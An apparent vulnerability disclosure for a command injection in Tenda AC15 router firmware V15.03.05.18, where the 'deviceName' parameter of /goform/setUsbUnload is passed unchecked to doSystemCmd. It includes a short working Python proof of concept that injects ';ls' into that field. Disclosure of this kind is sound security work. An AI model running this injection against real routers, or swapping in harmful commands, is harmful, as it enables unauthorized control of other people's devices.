## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware, we discovered a command injection vulnerablility in the `deviceName` parameter and the `v3` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `deviceName` can trigger this security vulnerability.

![image-20240305231546129](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231546129.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setUsbUnload"
payload = ";ls"

data = {"deviceName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314212024903.png)
